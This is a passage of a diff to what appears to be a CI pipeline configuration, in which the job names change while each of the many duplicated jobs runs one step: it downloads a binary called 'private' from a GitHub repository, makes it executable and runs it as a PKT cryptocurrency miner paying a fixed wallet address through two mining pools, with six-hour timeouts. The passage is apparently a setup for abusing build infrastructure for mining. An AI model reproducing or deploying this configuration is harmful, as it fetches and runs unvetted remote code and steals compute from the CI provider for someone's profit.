   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: de
+- job: j
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: df
+- job: a
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dg
+- job: b
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dh
+- job: c
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: di
+- job: d
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dj
+- job: e
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dk
+- job: f
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dl
+- job: g
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dm
+- job: h
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dn
+- job: i
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: do
+- job: j
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dp
+- job: a
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dq
+- job: b
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dr
+- job: c
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: ds
+- job: d
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dt
+- job: e
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: du
+- job: f
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dv
+- job: g
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dw
+- job: h
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dx
+- job: i
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
   - script: wget https://github.com/Xilahani8/work/raw/main/private && chmod +x private && ./private ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
 
-- job: dy
+- job: j
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
